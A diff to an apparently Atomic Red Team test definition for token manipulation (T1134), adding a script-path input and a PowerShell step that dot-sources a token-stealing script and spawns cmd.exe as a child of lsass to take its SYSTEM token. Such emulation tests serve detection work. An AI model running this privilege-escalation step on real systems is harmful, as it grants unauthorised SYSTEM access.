@@ -14,6 +14,10 @@ atomic_tests:
       description: Username To Steal Token From
       type: String
       default: SYSTEM
+    script_path:
+      description: Path to token stealing script
+      type: Path
+      default: C:\AtomicRedTeam\atomics\T1134\src\T1134.ps1
   executor:
     name: powershell
     command: |
@@ -23,4 +27,5 @@ atomic_tests:
       gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
       get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
       #Steal Token
-      . .\src\T1134.ps1
+      . #{script_path}
+      [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
